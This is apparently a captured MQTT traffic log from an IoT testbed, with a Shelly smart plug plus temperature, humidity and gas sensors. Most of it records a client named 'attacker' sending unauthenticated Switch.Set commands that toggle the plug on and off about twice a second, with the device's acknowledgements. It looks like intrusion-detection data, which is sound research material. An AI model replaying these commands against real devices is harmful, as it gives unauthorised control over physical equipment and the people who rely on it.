2026-04-22T16:18:50,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:50,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33263.45,""swi"
2026-04-22T16:18:50,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3806 33263.475 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:51,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:51,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3807 33263.952 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:51,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:51,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33263.95,""swi"
2026-04-22T16:18:51,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3808 33263.968 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:51,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:51,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3809 33264.450 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:51,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:51,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33264.45,""swi"
2026-04-22T16:18:51,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3810 33264.469 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:52,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:52,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3811 33264.951 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:52,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:52,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33264.95,""swi"
2026-04-22T16:18:52,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3812 33264.967 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:52,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:52,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3813 33265.451 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:52,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:52,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33265.45,""swi"
2026-04-22T16:18:52,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3814 33265.470 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:53,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:53,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3815 33265.952 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:53,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:53,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33265.95,""swi"
2026-04-22T16:18:53,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3816 33265.968 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:53,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:53,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3817 33266.452 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:53,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:53,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33266.45,""swi"
2026-04-22T16:18:53,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3818 33266.471 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:54,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:54,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3819 33266.953 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:54,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:54,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33266.95,""swi"
2026-04-22T16:18:54,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3820 33266.969 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:54,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:54,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3821 33267.455 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:54,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:54,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33267.45,""swi"
2026-04-22T16:18:54,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3822 33267.473 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:55,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:55,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3823 33267.954 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:55,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:55,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33267.95,""swi"
2026-04-22T16:18:55,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3824 33267.970 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:55,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:55,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3825 33268.454 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:55,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:55,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33268.45,""swi"
2026-04-22T16:18:55,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3826 33268.473 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:56,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:56,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3827 33268.954 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:56,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:56,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33268.95,""swi"
2026-04-22T16:18:56,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3828 33268.971 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:18:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:18:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:18:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:18:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:18:56,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:56,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3829 33269.455 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:56,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:56,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33269.45,""swi"
2026-04-22T16:18:56,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3830 33269.473 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:57,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:57,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3831 33269.955 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:57,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:57,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33269.95,""swi"
2026-04-22T16:18:57,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3832 33269.972 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:57,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:57,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3833 33270.456 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:57,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:57,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33270.45,""swi"
2026-04-22T16:18:57,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3834 33270.474 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:58,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:58,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3835 33270.957 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:58,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:58,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33270.95,""swi"
2026-04-22T16:18:58,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3836 33270.973 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:58,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:58,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3837 33271.460 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:58,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:58,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33271.46,""swi"
2026-04-22T16:18:58,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3838 33271.478 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:59,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3839 33271.958 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:59,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:59,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33271.95,""swi"
2026-04-22T16:18:59,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3840 33271.974 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:59,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3841 33272.459 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:59,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:59,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33272.46,""swi"
2026-04-22T16:18:59,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3842 33272.478 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3843 33272.959 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:00,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:00,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33272.96,""swi"
2026-04-22T16:19:00,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3844 33272.976 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3845 33273.459 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33273.46,""swi"
2026-04-22T16:19:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3846 33273.479 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3847 33273.963 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33273.96,""swi"
2026-04-22T16:19:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3848 33273.979 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3849 33274.461 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33274.46,""swi"
2026-04-22T16:19:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3850 33274.479 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3851 33274.961 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33274.96,""swi"
2026-04-22T16:19:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3852 33274.977 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3853 33275.462 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33275.46,""swi"
2026-04-22T16:19:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3854 33275.480 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3855 33275.963 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33275.96,""swi"
2026-04-22T16:19:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3856 33275.980 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3857 33276.467 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
